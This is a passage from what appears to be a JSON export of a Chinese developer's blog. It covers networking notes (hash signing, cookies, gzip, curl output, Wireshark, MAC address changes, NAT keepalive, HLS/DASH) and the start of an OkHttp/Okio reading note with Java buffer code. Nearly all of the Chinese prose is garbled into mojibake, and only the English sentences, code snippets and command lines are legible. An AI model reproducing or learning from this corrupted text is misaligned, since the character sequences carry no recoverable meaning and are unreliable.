â€œa0d63c5c4194a1d2a67b96391d8d52954ac3512eâ€åå°æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œåœ¨åå°æœåŠ¡çš„æ•°æ®åº“ä¸­SELECT * FROM USER_TABLE WHERE user_id_signed = â€œa0d63c5c4194a1d2a67b96391d8d52954ac3512eâ€;æ‰¾åˆ°äº†çš„è¯å°±ä¸€åˆ‡æ­£å¸¸ï¼Œæ‰¾ä¸åˆ°å°±403ï¼›ä¸Šè¿°è¿‡ç¨‹å³â€ç­¾åï¼Œä¸“ä¸šç‚¹è¯´ï¼Œå« ä¿¡æ¯æ‘˜è¦ç®—æ³•â€ã€‚ åœ¨yahooä¸Šæ‰¾åˆ°è¿™æ ·çš„è¯„è®º: SHA1é€šå¸¸ä¸æ˜¯ç”¨ä¾†åŠ å¯†è³‡æ–™ï¼Œè€Œæ˜¯ç”¨ä¾†ç”¢ç”Ÿè³‡æ–™çš„ç‰¹å¾µç¢¼ (fingerprint)ï¼Œä½ æ˜¯ä¸æ˜¯ç”¨éŒ¯æ¼”ç®—æ³•å•¦ ??æ˜¯çš„~~sha-1æ˜¯ä¸å¯é€†çš„ ä¹Ÿå³sha1è¿‡ç¨‹æ˜¯ä¸å¯é€†çš„åŠ å¯†è§£å¯†éœ€è¦è€—è´¹cpuèµ„æºï¼Œæš´åŠ›ç ´è§£å“ˆå¸Œå€¼çš„æˆæœ¬å¤ªé«˜ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢é‚£ä¸ªåœ¨çº¿åŠ å¯†ç½‘ç«™ä¸­æœ‰äº›åŠ å¯†æ–¹æ³•æ˜¯å¯åŠ å¯†å¯è§£å¯†(AES)çš„ï¼Œæœ‰äº›æ ¹æœ¬æ²¡æœ‰è§£å¯†çš„é€‰é¡¹(SHA1,MD5),æœ‰äº›æ¯”è¾ƒå¥‡æ€ªçš„(BASE64ç¼–ç ï¼ŒBASE64è§£ç ï¼ŒBASE64è¿˜èƒ½å°†å›¾ç‰‡è½¬æˆä¸€å¤§ä¸²å­—ç¬¦ä¸²)ï¼› å¯¹ç§°åŠ å¯†(cookie-session)session å¯ä»¥å­˜åœ¨ cookie ä¸­sessionData ä¸­ï¼Œä¸¢åˆ°å®¢æˆ·ç«¯ã€‚var sessionData = {username: â€˜alsotangâ€™, age: 22, company: â€˜alibabaâ€™, location: â€˜hangzhouâ€™}ç”¨sha1ç®—æ³•åŠ å¯†ä¹‹åä¸¢åˆ°cookieçš„ signedCookies è·Ÿ cookie-session è¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼š1ï¼‰æ˜¯å‰è€…ä¿¡æ¯å¯è§ä¸å¯ç¯¡æ”¹ï¼Œåè€…ä¸å¯è§ä¹Ÿä¸å¯ç¯¡æ”¹2ï¼‰æ˜¯å‰è€…ä¸€èˆ¬æ˜¯é•¿æœŸä¿å­˜ï¼Œè€Œåè€…æ˜¯ session cookiecookie-session çš„å®ç°è·Ÿ signedCookies å·®ä¸å¤šã€‚ä¸è¿‡ cookie-session æˆ‘ä¸ªäººå»ºè®®ä¸è¦ä½¿ç”¨ï¼Œæœ‰å—åˆ°å›æ”¾æ”»å‡»çš„å±é™©ã€‚æ‰€ä»¥æœ€å¥½æŠŠcookie session ä¹Ÿä¸¢è¿›ç¼“å­˜ åˆå­¦è€…å®¹æ˜“çŠ¯çš„ä¸€ä¸ªé”™è¯¯æ˜¯ï¼Œå¿˜è®°äº† session_id åœ¨ cookie ä¸­çš„å­˜å‚¨æ–¹å¼æ˜¯ session cookieã€‚å³ï¼Œå½“ç”¨æˆ·ä¸€å…³é—­æµè§ˆå™¨ï¼Œæµè§ˆå™¨ cookie ä¸­çš„ session_id å­—æ®µå°±ä¼šæ¶ˆå¤±ã€‚å¸¸è§çš„åœºæ™¯å°±æ˜¯åœ¨å¼€å‘ç”¨æˆ·ç™»é™†çŠ¶æ€ä¿æŒæ—¶ã€‚ GZIPæ˜¯éœ€è¦è€—è´¹cpuçš„ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§ä»¥cpuèµ„æºæ¢å–å¸¦å®½çš„ç­–ç•¥ If you keep gzip compression enabled here, note that you are trading increased CPU costs in exchange for your lower bandwidth use. Set the gzip_comp_level to a value between 1 and 9, where 9 requires the greatest amount of CPU resources and 1 requires the least. The default value is 1. windowsä¸‹hostæ–‡ä»¶ä¿®æ”¹å¾ˆç®€å•ï¼Œlinuxä¸‹åœ¨/etc/hostsé‡Œã€‚è¿™é‡Œé¢éƒ½å†™äº†ä¸€å¥æ˜ å°„ï¼š localhost : 127.0.0.1 ## the local loopback interface. è¡¥ä¸Šä¸€ä¸ªåœ¨windowsä¸Šå®‰è£…curlçš„æ–¹æ³•how-do-i-install-set-up-and-use-curl-on-windowsã€‚ç®€å•è¯´å°±æ˜¯ä¸‹ä¸€ä¸ªwindows x64çš„ç‰ˆæœ¬ï¼Œç„¶åæŠŠcurl.exeæ‰€åœ¨ä½ç½®æ·»åŠ åˆ°ç¯å¢ƒå˜é‡çš„PATHä¸­ï¼Œé‡å¯cmdå°±å¥½äº†ã€‚ç„¶åå¼€å§‹æµ‹è¯•ä¸€äº›ä¸»æµç½‘ç«™ 126é‚®ç®±è¿”å›301(Moved Permanently)ï¼ŒåŒæ—¶å‘Šè¯‰æµè§ˆå™¨å»httpsç«™ç‚¹è®¿é—® curl -v mail.126.com * Rebuilt URL to: mail.126.com/ * Trying 220.181.15.150... * TCP_NODELAY set * Connected to mail.126.com (220.181.15.150) port 80 (#0) &gt; GET / HTTP/1.1 &gt; Host: mail.126.com &gt; User-Agent: curl/7.58.0 &gt; Accept: */* &gt; &lt; HTTP/1.1 301 Moved Permanently &lt; Server: nginx &lt; Date: Sun, 11 Feb 2018 06:16:02 GMT &lt; Content-Type: text/html &lt; Content-Length: 178 &lt; Connection: keep-alive &lt; Location: https://mail.126.com/ &lt; &lt;html&gt; &lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor=&quot;white&quot;&gt; &lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; * Connection #0 to host mail.126.com left intact wiresharkåœ¨windowsä¸‹ä¹Ÿèƒ½æŠ“åŒ…ï¼Œé¦–å…ˆå®‰è£…ï¼Œå®‰è£…å¥½ä¹‹åå¦‚æœæ²¡æœ‰æ£€æµ‹å‡ºç½‘å¡ï¼Œéœ€è¦å»ä¸‹è½½ä¸€ä¸ªwin10pcapã€‚ wireSharkæŠ“åŒ…å‘ç°ï¼Œæ¯ä¸ªpackageå…¶å®å°±æ˜¯å‘é€äº†ä¸€å¤§å †hexoDecimalã€‚ å¼€å¤´æ˜¯æœ¬æœºç½‘å¡çš„macåœ°å€(6ä¸ªbytes)ï¼Œç´§è·Ÿç€æ˜¯ip(srcå’Œdst),æœ€åä¸€éƒ¨åˆ†æ˜¯tcp(åŒ…æ‹¬portç­‰)ã€‚wikipediaä¸Šè¯´ MACåœ°å€å…±48ä½ï¼ˆ6ä¸ªå­—èŠ‚ï¼‰ï¼Œä»¥åå…­è¿›åˆ¶è¡¨ç¤ºã€‚å‰24ä½ç”±IEEEå†³å®šå¦‚ä½•åˆ†é…ï¼Œå24ä½ç”±å®é™…ç”Ÿäº§è¯¥ç½‘ç»œè®¾å¤‡çš„å‚å•†è‡ªè¡ŒæŒ‡å®šã€‚ æˆ‘å·²ç»çŒœåˆ°æ ¹æ®MACåœ°å€è¯†åˆ«ç½‘å¡ç”Ÿäº§å•†äº†ã€‚ NATè¶…æ—¶[è¿™ä¸ªä¸»è¦æ˜¯ç§»åŠ¨ç«¯ä¿æ´»çš„è¯é¢˜ä¸‹éœ€è¦å…³æ³¨çš„]å› ä¸º IP v4 çš„ IP é‡æœ‰é™ï¼Œè¿è¥å•†åˆ†é…ç»™æ‰‹æœºç»ˆç«¯çš„ IP æ˜¯è¿è¥å•†å†…ç½‘çš„ IPï¼Œæ‰‹æœºè¦è¿æ¥ Internetï¼Œå°±éœ€è¦é€šè¿‡è¿è¥å•†çš„ç½‘å…³åšä¸€ä¸ªç½‘ç»œåœ°å€è½¬æ¢(Network Address Translationï¼ŒNAT)ã€‚ç®€å•çš„è¯´è¿è¥å•†çš„ç½‘å…³éœ€è¦ç»´æŠ¤ä¸€ä¸ªå¤–ç½‘ IPã€ç«¯å£åˆ°å†…ç½‘ IPã€ç«¯å£çš„å¯¹åº”å…³ç³»ï¼Œä»¥ç¡®ä¿å†…ç½‘çš„æ‰‹æœºå¯ä»¥è·Ÿ Internet çš„æœåŠ¡å™¨é€šè®¯ã€‚å¤§éƒ¨åˆ†ç§»åŠ¨æ— çº¿ç½‘ç»œè¿è¥å•†éƒ½åœ¨é“¾è·¯ä¸€æ®µæ—¶é—´æ²¡æœ‰æ•°æ®é€šè®¯æ—¶ï¼Œä¼šæ·˜æ±° NAT è¡¨ä¸­çš„å¯¹åº”é¡¹ï¼Œé€ æˆé“¾è·¯ä¸­æ–­ã€‚é•¿è¿æ¥å¿ƒè·³é—´éš”å¿…é¡»è¦å°äºNATè¶…æ—¶æ—¶é—´(aging-time)ï¼Œå¦‚æœè¶…è¿‡aging-timeä¸åšå¿ƒè·³ï¼ŒTCPé•¿è¿æ¥é“¾è·¯å°±ä¼šä¸­æ–­ï¼ŒServerå°±æ— æ³•å‘é€Pushç»™æ‰‹æœºï¼Œåªèƒ½ç­‰åˆ°å®¢æˆ·ç«¯ä¸‹æ¬¡å¿ƒè·³å¤±è´¥åï¼Œé‡å»ºè¿æ¥æ‰èƒ½å–åˆ°æ¶ˆæ¯ã€‚ NATæ˜ å°„(æŠŠ192.168.1.xxè½¬æ¢æˆå¤–éƒ¨ipå’Œportçš„æ–¹æ¡ˆ) TCPé•¿è¿æ¥æœ¬è´¨ä¸Šä¸éœ€è¦å¿ƒè·³åŒ…æ¥ç»´æŒï¼Œå› ä¸ºæ— è®ºå®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨éƒ½ä¸çŸ¥é“ä¸¤è€…ä¹‹é—´çš„é¢é€šé“æ˜¯å¦æ–­å¼€äº†ã€‚å¿ƒè·³åŒ…ä¸€ä¸ªä¸»è¦çš„ä½œç”¨å°±æ˜¯é˜²æ­¢NATè¶…æ—¶çš„ã€‚ ===============================æœåŠ¡å™¨è¿”å›çš„Sst-Cookieå¯ä»¥åƒä¸Šé¢ä¸€æ ·æœ‰å¾ˆå¤šä¸ªã€‚Set-Cookie: BAIDUID=259D5F393E329E8E44651C589037C093:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.comåŸºæœ¬ä¸Šæ ¼å¼å°±æ˜¯ï¼š SOMEKEY=SOMEVALUE; expires=æŸä¸ªæ—¥æœŸ; path=â€æŸä¸ªè·¯å¾„â€; domain=â€æŸä¸ªä¸»ç«™â€ expires,path,domainè¿™äº›ä¸œè¥¿éƒ½æ˜¯è§„èŒƒï¼Œä¸‹ä¸€æ¬¡è¯·æ±‚æ˜¯ï¼Œåªæœ‰å½“è¿™ä¸ªcookieçš„domainå’ŒpathåŒ¹é…çš„ä¸Šæ‰ä¼šå‘é€è¿™ä¸ªCookieã€‚ è‡³å°‘åœ¨linuxå’Œmacç¯å¢ƒä¸‹ï¼Œmacåœ°å€æ˜¯å¯ä»¥æ”¹çš„ã€‚ ifconfig eth0 downifconfig eth0 hw ether xx:xx:xx:xx:xx:xxifconfig eth0 up m3u8å°±æ˜¯å¾ˆå¤štsæ–‡ä»¶çš„ç›®å½•ã€è…¾è®¯buglyå¹²è´§åˆ†äº«ã€‘HTML 5 è§†é¢‘ç›´æ’­ä¸€ç«™å¼æ‰«ç›².m3u8 æ–‡ä»¶ï¼Œå…¶å®å°±æ˜¯ä»¥ UTF-8 ç¼–ç çš„ m3u æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æœ¬èº«ä¸èƒ½æ’­æ”¾ï¼Œåªæ˜¯å­˜æ”¾äº†æ’­æ”¾ä¿¡æ¯çš„æ–‡æœ¬æ–‡ä»¶ï¼šå°±æ˜¯è¯´æŠŠä¸€ä¸ªè§†é¢‘åˆ‡å‰²æˆå¾ˆå¤šä¸ªTSåˆ†ç‰‡æ–‡ä»¶ã€‚è¿™é‡Œé¢è¿˜èƒ½ç‰µæ‰¯åˆ°é˜²ç›—é“¾ç­‰é—®é¢˜ã€‚ åœ¨vimeoä¸Šè§è¿‡.m4sè¿™ç§åç¼€çš„æµåª’ä½“ exoplayerçš„ä½œè€…åœ¨mediumä¸Šçš„ä¸€ç¯‡æ–‡ç« è§£é‡Šäº†dashåœ¨ç›´æ’­åè®®ä¸­çš„ä¼˜ç‚¹ç¿»è¯‘ä¸€ä¸‹ adaptive streaming over HTTPçš„åè®®æœ‰ä¸‰ç§ï¼ŒHTTP Live Streaming (HLS),SmoothStreamingDynamic Adaptive Streaming over HTTP (DASH)HLSæ˜¯æœ€æµè¡Œçš„ è¿™ä¸‰ç§ç›´æ’­åè®®éƒ½å°†è§†é¢‘æ–‡ä»¶åˆ‡å‰²æˆå¾ˆå¤šä¸ªå°çš„chunksï¼ŒåŒæ—¶å…è®¸clientåœ¨ä¸åŒçš„ç”»è´¨ä¹‹é—´åˆ‡æ¢ã€‚DASH and SmoothStreaming with fMP4 éƒ½è¦æ±‚ä¸åŒç”»è´¨ä¹‹é—´çš„chunk boundarieså¯¹é½ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯åœ¨ä¸åŒç”»è´¨ä¹‹é—´åˆ‡æ¢çš„æ—¶å€™å°±ä¸éœ€è¦ä¸‹è½½é‚£äº›é‡å çš„éƒ¨åˆ†äº†ï¼Œä½†HLSä¸æ˜¯è¿™æ ·çš„ã€‚å°¤å…¶æ˜¯åœ¨ç”¨æˆ·ä»ç½‘é€Ÿå¿«åˆ‡æ¢åˆ°ç½‘é€Ÿå·®çš„æƒ…å†µä¸‹ï¼Œä½“éªŒæ›´å·®ã€‚ Linuxä¸‹TCPå»¶è¿Ÿç¡®è®¤(Delayed Ack)æœºåˆ¶å¯¼è‡´çš„æ—¶å»¶é—®é¢˜åˆ†æ TCP Nagleç®—æ³•&amp;&amp;å»¶è¿Ÿç¡®è®¤æœºåˆ¶(å¾®è½¯æ›´æ–°KB328890) 301å’Œ302çš„åŒºåˆ«çœ‹ä¸Šå»ä¸å¤§ï¼Œä½†å¹³æ—¶å‡ ä¹çœ‹ä¸åˆ°301çš„åŸå› å°±åœ¨äº301çš„ç»“æœä¼šè¢«æµè§ˆå™¨ç¼“å­˜ï¼Œä¸‹å›è®¿é—®è¿™ä¸ªurlæµè§ˆå™¨éƒ½ä¸ä¼šå‘å‡ºç½‘ç»œè¯·æ±‚ï¼Œæ‰€ä»¥æœ¬ç€ä¸è¦åšç»çš„åŸåˆ™ï¼Œç»å¤§å¤šæ•°äººéƒ½ä¸ä¼šè¿”å›301 tcp/ipè¯¦è§£","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"OkHttpå’ŒOkioé˜…è¯»ç¬”è®°","date":"2017-07-21T00:02:56.000Z","path":"2017/07/21/2017-07-21-okhttp-demisified/","text":"å¾ˆæ—©çš„æ—¶å€™å°±çŸ¥é“ï¼ŒOkHttpåœ¨ioå±‚é¢ä¸Šçš„æ“ä½œæ˜¯ç”±Okioä»£ä¸ºå®Œæˆçš„ï¼Œæ‰€ä»¥å®é™…æ„ä¹‰ä¸Šå’ŒSocketæ‰“äº¤é“çš„åº”è¯¥æ˜¯Okioã€‚è€ŒOkioåˆæ¯”ä¼ ç»Ÿçš„java ioè¦é«˜æ•ˆã€‚æ‰€ä»¥ï¼Œåœ¨åˆ†æOkHttpä¹‹å‰ï¼Œæœ‰å¿…è¦é’ˆå¯¹Okioçš„ä¸€äº›æ–¹æ³•è¿›è¡Œå±•å¼€ï¼Œä½œä¸ºåé¢è¯»å†™æ“ä½œçš„é“ºå«ã€‚ Okio -&gt; OkHttp -&gt; Picaso -&gt; RetrofitOkioç‰ˆæœ¬ 1.13.0OkHttpç‰ˆæœ¬ 3.8.0 1. Okioä¸java ioç›¸æ¯”çš„ä¼˜åŠ¿javaçš„InputStreamå¯ä»¥è¢«æŸ¥çœ‹æˆæ˜¯ä¸€ä¸ªæ•°æ®çš„æ¥æºï¼Œè°ƒç”¨readæ–¹æ³•ä»ä¸­è¯»å–æ•°æ®ã€‚ç”±äºæœ‰äº›æ–‡ä»¶ç‰¹åˆ«å¤§ï¼Œæˆ‘ä»¬ä¸å¯èƒ½åœ¨å†…å­˜ä¸­åˆ†é…ä¸€ä¸ªå’Œæ–‡ä»¶å¤§å°ä¸€æ ·å¤§çš„å­—èŠ‚æ•°ç»„æ¥ä¸“é—¨æ¥è¯»å†™æ–‡ä»¶ã€‚å› æ­¤éœ€è¦ä¼ å…¥ä¸€ä¸ªç¼“å†²æ•°ç»„ã€‚æ‰€ä»¥ä¸€èˆ¬çš„è¯»å†™ç¨‹åºçš„ä»£ç æ˜¯è¿™ä¹ˆå†™çš„ public abstract class InputStream implements Closeable{ public int read(byte b[]) throws IOException { return read(b, 0, b.length); } } public static void main(String[] args) throws Exception { // æŒ‡å®šè¦è¯»å–æ–‡ä»¶çš„ç¼“å†²è¾“å…¥å­—èŠ‚æµ BufferedInputStream in = new BufferedInputStream(new FileInputStream(&quot;F:\\\\test.jpg&quot;)); File file = new File(&quot;E:\\\\test.jpg&quot;); if (file != null) { file.createNewFile(); } // æŒ‡å®šè¦å†™å…¥æ–‡ä»¶çš„ç¼“å†²è¾“å‡ºå­—èŠ‚æµ BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(file)); byte[] bb = new byte[1024];// ç”¨æ¥å­˜å‚¨æ¯æ¬¡è¯»å–åˆ°çš„å­—èŠ‚æ•°ç»„ int n;// æ¯æ¬¡è¯»å–åˆ°çš„å­—èŠ‚æ•°ç»„çš„é•¿åº¦ while ((n = in.read(bb)) != -1) { out.write(bb, 0, n);// å†™å…¥åˆ°è¾“å‡ºæµ } out.close();// å…³é—­æµ in.close(); } BufferedInputStreamå’ŒBufferedOutputStreamå°±æ˜¯æä¾›äº†è¿™æ ·çš„ç¼“å†²ç­–ç•¥ï¼Œå…¶å†…éƒ¨é»˜è®¤åˆ†é…äº†ä¸€ä¸ªé»˜è®¤å¤§å°çš„å­—èŠ‚æ•°ç»„ï¼Œæˆ–è€…åœ¨readæ–¹æ³•ä¸­ä¼ å…¥ä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼Œæ¯æ¬¡ä¸€ä¸ªbyteä¸€ä¸ªbyteçš„è¯»ï¼Œç„¶åå°†è¯»å‡ºæ¥çš„å†…å®¹å†™è¿›outPutStreamã€‚è¯»åˆ°-1å°±æ˜¯æ–‡ä»¶ç»ˆæ­¢(EOF)ã€‚å…·ä½“åŸç†å¯ä»¥å‚è€ƒIBMçš„æ·±å…¥åˆ†æ Java I/O çš„å·¥ä½œæœºåˆ¶ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œbuffer[]ä½œä¸ºä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼Œå…¶å®¹é‡æ˜¯æ’å®šçš„ã€‚å‡è®¾æˆ‘ä»¬æƒ³è¦ä¸€æ¬¡æ€§è¯»å–ç‰¹åˆ«å¤šçš„æ•°æ®æ€ä¹ˆåŠã€‚ä¾‹å¦‚httpçš„response headerä¸€èˆ¬é•¿è¿™æ ·,ç„¶è€Œå®é™…ä¸Šåœ¨æ— çº¿ç”µä¼ æ’­çš„è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€è¡Œçš„åé¢éƒ½è·Ÿäº†ä¸€ä¸ªæ¢è¡Œç¬¦â€™\\r\\nâ€™,è€Œä¸”æ— çº¿ç”µä¼ æ’­çš„æ—¶å€™å…¶å®æ ¹æœ¬æ²¡æœ‰æ¢è¡Œçš„æ¦‚å¿µï¼Œå°±æ˜¯ä¸€ä¸ªå­—èŠ‚è·Ÿç€ä¸€ä¸ªå­—èŠ‚ã€‚å‡å¦‚æœåŠ¡å™¨è‡ªå·±å®šä¹‰äº†ç‰¹åˆ«é•¿çš„headerå­—æ®µï¼Œinputstreamè¯»åˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œäº‹å…ˆé¢„è®¾çš„å­—èŠ‚æ•°ç»„(æ²¡æ³•æ”¹äº†)è£…ä¸ä¸‹ï¼Œä¸€ç§ç®€å•ç²—æš´çš„æ–¹å¼æ˜¯å°è¯•æ‰©å®¹ï¼Œè¿™å°±æ„å‘³ç€è¦æŠŠæ•°æ®ä»åŸå§‹æ•°ç»„copyåˆ°æ–°çš„æ•°ç»„ï¼Œä¸¢æ‰æ—§çš„æ•°ç»„ï¼ŒæŠŠæŒ‡é’ˆæŒ‡å‘æ–°çš„æ•°ç»„(ä¸€ä¸ªæ˜¯allocateæ•°ç»„ï¼Œä¸€ä¸ªæ˜¯arrayCopyï¼Œè¿™ä¿©éƒ½é€ æˆäº†æ€§èƒ½æŸè€—),å½“ç„¶jdkè‚¯å®šä¸æ˜¯è¿™ä¹ˆå¹²çš„ã€‚BufferedInputStreamæ˜¯ç”¨æ¥åšæä¾›äº†ç¼“å­˜çš„æ•ˆæœï¼ŒDataInputStreamæä¾›äº†è¯»å–åŸºæœ¬æ•°æ®ç±»å‹çš„åŠŸèƒ½(æ¯”æ–¹è¯´4ä¸ªbyteså½“æˆä¸€ä¸ªint)ï¼ŒInputStreamReaderçš„readæ–¹æ³•éœ€è¦æä¾›ä¸€ä¸ªchar[]ï¼Œç„¶åå¤–éƒ¨æ‹¿ç€è¿™ä¸ªchar[]å»ç”Ÿæˆä¸€ä¸ªString. HTTP/1.1 200 OK Bdpagetype: 1 Bdqid: 0xc8f942640001e753 Bduserid: 0 Cache-Control: private Connection: Keep-Alive Content-Encoding: gzip Content-Type: text/html; charset=utf-8 Date: Fri, 21 Jul 2017 15:35:58 GMT Expires: Fri, 21 Jul 2017 15:35:29 GMT Server: BWS/1.1 Set-Cookie: BDSVRTM=0; path=/ Set-Cookie: BD_HOME=0; path=/ Set-Cookie: H_PS_PSSID=1428_21110_20930; path=/; domain=.baidu.com Strict-Transport-Security: max-age=172800 Vary: Accept-Encoding X-Powered-By: HPHP X-Ua-Compatible: IE=Edge,chrome=1 Transfer-Encoding: chunked å¯¹äºHttpè¿™ç§é¢‘ç¹çš„è¯»å†™æ“ä½œï¼Œallocateæ•°ç»„å’Œcopyæ•°æ®æ— å½¢ä¸­å‡æ…¢äº†ç½‘ç»œè®¿é—®çš„é€Ÿåº¦ã€‚ Okioçš„è§£å†³æ–¹æ¡ˆ Buffer buffer = new Buffer();//cheap ,allocation literal nothing buffer.writeUtf8(&quot;Hello Okio&quot;); //javaä¸­ä¸€ä¸ªè‹±æ–‡å­—ç¬¦å ä¸€ä¸ªå­—èŠ‚(byte)ï¼Œä¸€ä¸ªæ±‰å­—å 2ä¸ªå­—èŠ‚(byte) buffer.writeUtf8(&quot;you can &quot;); //å¯ä»¥æƒ³è±¡segmentä¸­è¢«å¡è¿›äº†&quot;you can &quot;è¿™å‡ ä¸ªbyte buffer.writeUtf8(&quot;Go faster&quot;); Okioå°†è¯»å†™æ“ä½œé›†ä¸­åˆ°åˆ°Bufferè¿™ä¸ªç±»ä¸­ï¼Œç”¨Sinkå’ŒSourceåˆ†åˆ«ä»£è¡¨æ•°æ®çš„å»å‘å’Œæ¥æºã€‚è€Œæ•°æ®çš„æ‰¿è½½ç±»æ˜¯Segment,è¯»å–æ•°æ®(read)çš„æ—¶å€™ä»SegmentPoolä¸­ç´¢å–Segmentï¼Œè¯»åˆ°Segmentçš„byte[]æ•°ç»„ä¸­ï¼Œè£…ä¸ä¸‹äº†å†æ‹¿ä¸€ä¸ªSegmentã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­æ˜¯æ²¡æœ‰ new byte[]æ“ä½œçš„ã€‚ Read from a sourceï¼Œ write to a sink public final class Buffer implements BufferedSource, BufferedSink, Cloneable { Segment head; long size; public Buffer() { //æ„é€ å‡½æ•°é‡Œä¸åˆ†é…ä»»ä½•å¯¹è±¡ï¼Œæ‰€ä»¥åˆ›å»ºä¸€ä¸ªBufferå‡ ä¹æ²¡æœ‰ä»€ä¹ˆæ€§èƒ½å¼€é”€ } final class Segment { static final int SIZE = 8192; static final int SHARE_MINIMUM = 1024; final byte[] data; int pos; int limit; boolean shared; boolean owner; Segment next; Segment prev; } } ç°åœ¨é‚£ä¸ªè¯»å–ä¸€ä¸ªæ–‡ä»¶å†™åˆ°å¦ä¸€ä¸ªæ–‡ä»¶çš„ç¨‹åºå¯ä»¥å†™æˆè¿™æ ·: sink = Okio.sink(dstFile); //è¿”å›äº†ä¸€ä¸ªSinkåŒ¿åç±»ï¼Œwriteçš„æ—¶å€™ä½¿ç”¨public void write(Buffer source, long byteCount)æ–¹æ³•è¿›è¡Œå†™æ“ä½œ source = Okio.source(srcFile); Buffer buf = new Buffer(); for (long readCount; (readCount = source.read(buf, 2048)) != -1; ) { sink.write(buf, readCount); } çœ‹èµ·æ¥è¿˜æ˜¯åœ¨æ•°æ®æºå’Œæ•°æ®ç»ˆç‚¹ä¹‹é—´å¡äº†ä¸€ä¸ªç¼“å†²å±‚ï¼Œsink(dst)å’Œsource(src)éƒ½æ˜¯æ¥å£ï¼ŒBufferåŒæ—¶å®ç°äº†è¿™ä¿©æ¥å£ã€‚writeæ˜¯ä»å¤–é¢æ‹¿æ•°æ®å¡åˆ°è‡ªå·±çš„æ•°ç»„ä¸­ï¼Œæ‰€ä»¥æ¯æ¬¡å†™çš„æ—¶å€™æˆ–è®©Bufferçš„Sizeå˜å¤§(ä»segment poolä¸­å€Ÿç”¨segment)ã€‚Buffer(Source)çš„readæ–¹æ³•æ˜¯æŠŠæ•°æ®ä»Bufferä¸­æ‹¿å‡ºæ¥ï¼Œæ‰€ä»¥ä¼šè®©Bufferçš„sizeå˜å°(æ¯ä¸€ä¸ªSegmentè¯»å®Œäº†ä¼šè¿”å›åˆ°segment poolä¸­)åœ¨Bufferçš„æ‰€æœ‰readXXXæ–¹æ³•ä¸­éƒ½èƒ½çœ‹åˆ°è¿™ä¹ˆä¸€å¥è¯ SegmentPool.recycle(segment)å› ä¸ºBufferå†…éƒ¨æ˜¯é€šè¿‡Segmentçš„nextå’Œprevå®ç°äº†åŒå‘é“¾è¡¨ï¼Œwriteæ˜¯åœ¨å°¾éƒ¨æ·»åŠ æ•°æ®ï¼Œreadæ˜¯ä»å¤´éƒ¨è¯»å–æ•°æ®å¹¶ç§»é™¤ã€‚ Okioèƒ½å¤Ÿå®ç°é«˜æ•ˆç‡çš„æ ¸å¿ƒåœ¨äº,åœ¨javaçš„inputStreamå’ŒBufferedInputStreamä¸­ï¼Œå¦‚æœä¸¤å—ç¼“å†²åŒºä¹‹é—´æƒ³è¦äº¤æ¢æ•°æ®ã€‚å‰é¢æåˆ°çš„æ‰©å®¹æƒ…å†µï¼Œä»ä¸€ä¸ªæ•°ç»„æŠŠæ•°æ®å¤åˆ¶åˆ°å¦ä¸€ä¸ªæ›´å¤§çš„æ•°ç»„ï¼Œå¿…é¡»èµ°arrayCopyã€‚ç½‘ä¸ŠæŸ¥æ‰¾äº†å¾ˆå¤šåšå®¢ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯java ioé‡‡ç”¨äº†è£…é¥°è€…æ¨¡å¼ï¼Œä¸åŒStreamä¹‹é—´è¦åŒ…ä¸€å±‚ã€‚å†™æ•°æ®æ—¶ï¼Œå†™åŸå§‹æ•°æ®è¦ç”¨DataOutputStreamï¼Œä½¿ç”¨å¸¦ç¼“å†²çš„å†™è¦ç”¨BuffedOutputStreamï¼Œä½¿ç”¨å­—ç¬¦ç¼–ç è¦ç”¨OutputStreamWriter,å†™å­—èŠ‚æ•°ç»„æœ‰ByteArrayOutputStreamã€‚è¯»æ•°æ®æ—¶ä¹Ÿæ˜¯ï¼ŒåŸå§‹æ•°æ®è¦ç”¨DataInputStreamï¼Œå¸¦ç¼“å†²çš„è¦ç”¨BufferedInputStream,å­—ç¬¦ç¼–ç è¦ç”¨InputStreamReaderï¼Œè¯»å­—èŠ‚æ•°æœ‰ByteArrayInputStreamã€‚ æ¥çœ‹ä¸‹å…¶ä¸­å¸¦bufferçš„è£…é¥°ç±»æ˜¯æ€ä¹ˆåˆ›å»ºçš„ï¼Œé¡ºä¾¿æŠŠjava ioæ‰¹åˆ¤ä¸€ä¸‹ã€‚ ByteArrayOutPutStream baos = new ByteArrayOutPutStream(); ByteArrayInputStream bis = new ByteArrayInputStream(baos.toByteAarray()); //toByteArryå†…éƒ¨è°ƒç”¨äº†Arrays.copyOf()ï¼Œåˆ›å»ºäº†æ–°å¯¹è±¡ public BufferedInputStream(InputStream in, int size) { super(in); if (size &lt;= 0) { throw new IllegalArgumentException(&quot;Buffer size &lt;= 0&quot;); } buf = new byte[size]; //åˆ›å»ºæ–°æ•°ç»„ } public BufferedOutputStream(OutputStream out, int size) { super(out); if (size &lt;= 0) { throw new IllegalArgumentException(&quot;Buffer size &lt;= 0&quot;); } buf = new byte[size]; //åˆ›å»ºæ•°ç»„ } åŒæ ·çš„äº‹æƒ…åœ¨okioä¸­æ˜¯è¿™ä¹ˆå¹²çš„ RealBufferedSource(Source source) { if(source == null) { throw new NullPointerException(&quot;source == null&quot;); } else { this.source = source; //å…¶å®æ˜¯buffer } } RealBufferedSink(Sink sink) { if(sink == null) { throw new NullPointerException(&quot;sink == null&quot;); } else { 